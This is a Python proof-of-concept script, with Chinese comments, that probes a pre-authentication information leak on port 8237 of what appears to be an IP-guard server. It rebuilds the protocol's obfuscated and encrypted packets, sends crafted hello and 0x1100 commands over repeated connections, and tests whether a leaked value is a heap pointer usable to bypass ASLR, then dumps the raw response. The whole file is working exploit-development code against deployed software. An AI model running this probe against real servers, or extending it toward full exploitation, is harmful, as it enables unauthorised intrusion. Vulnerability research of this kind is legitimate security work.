"""poc_8237_ptr_leak.py — 验证 8237 pre-auth 信息泄露的 0x40E68680 是不是真指针

策略:
  - 5 次独立 TCP 连接,每次 hello + 一个解锁 96B 响应的 cmd
  - 提取 offset 0x08 的 QWORD
  - 如果 5 次都一样 → 静态常量,无 ASLR 价值
  - 如果不同 → 进程内动态指针 → **ASLR 泄露**

用法:
  python poc_8237_ptr_leak.py 192.168.2.130
"""
import os, socket, struct, sys, zlib

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.crypto import (
    HDR_MAGIC, FLAG_CRYPT, deobf_header, obf_header,
    encrypt_payload, decrypt_payload,
)


def build_pkt(flags, cmd, sub, body=b"", key16=None):
    if key16 is None: key16 = os.urandom(16)
    if flags & FLAG_CRYPT and body:
        body = encrypt_payload(flags, key16, body)
    hdr = bytearray(32)
    hdr[0:2] = HDR_MAGIC
    struct.pack_into("<H", hdr, 2, flags)
    struct.pack_into("<H", hdr, 4, cmd)
    struct.pack_into("<H", hdr, 6, sub)
    hdr[8:24] = key16
    struct.pack_into("<I", hdr, 28, len(body))
    return obf_header(bytes(hdr)) + body


def recv_pkt(s, timeout=3.0):
    s.settimeout(timeout)
    hdr = b""
    while len(hdr) < 32:
        c = s.recv(32 - len(hdr))
        if not c: raise ConnectionError("closed")
        hdr += c
    deobf = deobf_header(hdr)
    plen = struct.unpack_from("<I", deobf, 28)[0]
    body = b""
    while len(body) < plen:
        c = s.recv(plen - len(body))
        if not c: raise ConnectionError("closed")
        body += c
    return hdr + body


def parse_resp(pkt):
    deobf = deobf_header(pkt[:32])
    flags = struct.unpack_from("<H", deobf, 2)[0]
    plen = struct.unpack_from("<I", deobf, 28)[0]
    body = pkt[32:32+plen]
    key = bytes(deobf[8:24])
    plain = b""
    try:
        plain = decrypt_payload(flags, key, body)
        if plain and plain[:2] in (b"\x78\x01", b"\x78\x9c", b"\x78\xda"):
            try: plain = zlib.decompress(plain)
            except: pass
    except: pass
    return {"flags": flags, "plen": plen, "plain": plain}


def fetch_leak(host, port):
    s = socket.create_connection((host, port), timeout=5.0)
    s.settimeout(5.0)
    try:
        # hello (会自动给 1100 等触发 96B 响应)
        s.sendall(build_pkt(flags=0x4500, cmd=0x1001, sub=0))
        try: recv_pkt(s, timeout=2.0)
        except: pass
        # 发 cmd=0x1100 触发 96B 响应
        s.sendall(build_pkt(flags=0x4500, cmd=0x1100, sub=0))
        r = parse_resp(recv_pkt(s, timeout=3.0))
        return r["plain"]
    finally:
        try: s.close()
        except: pass


def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(1)
    host = sys.argv[1]

    print(f"[*] Probing 8237 leak determinism on {host}\n")
    print(f"{'#':>3}  {'qword@+8':<20} {'full 40B hex':<82}")
    print("-" * 110)
    samples = []
    for i in range(5):
        try:
            plain = fetch_leak(host, 8237)
        except Exception as e:
            print(f"{i:>3}  EXC: {e}")
            continue
        if not isinstance(plain, bytes) or len(plain) < 16:
            print(f"{i:>3}  short response: {plain[:40].hex() if isinstance(plain, bytes) else '?'}")
            continue
        qword = struct.unpack_from("<Q", plain, 8)[0]
        full = plain[:40].hex()
        print(f"{i:>3}  0x{qword:016x}   {full}")
        samples.append(qword)

    if len(set(samples)) == 1:
        print(f"\n→ DETERMINISTIC across {len(samples)} connections.")
        print(f"  value = 0x{samples[0]:016x}")
        print(f"  这是 **服务器常量** (server-side singleton id 或编译期常量),NOT a pointer leak.")
    elif len(set(samples)) > 1:
        print(f"\n⭐ VARIES across connections! {len(set(samples))} unique values out of {len(samples)}")
        print(f"  这是 **per-connection 动态值**,可能是:")
        print(f"    - 堆指针 → ASLR bypass primitive")
        print(f"    - session id (低位变化) → 仍可能含地址信息")

    # 完整 dump 第一个 sample (66B 全部)
    print(f"\n=== Full first response dump ===")
    try:
        plain = fetch_leak(host, 8237)
        if isinstance(plain, bytes):
            for off in range(0, len(plain), 16):
                chunk = plain[off:off+16]
                hx = " ".join(f"{b:02x}" for b in chunk)
                asc = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
                print(f"  {off:04x}  {hx:<48}  {asc}")
            try:
                wcs = plain.decode("utf-16-le", errors="ignore")
                import re
                runs = re.findall(r'[\x20-\x7e]{3,}', wcs)
                if runs:
                    print(f"\n  wcs runs: {runs}")
            except: pass
    except Exception as e:
        print(f"  EXC: {e}")


if __name__ == "__main__":
    main()
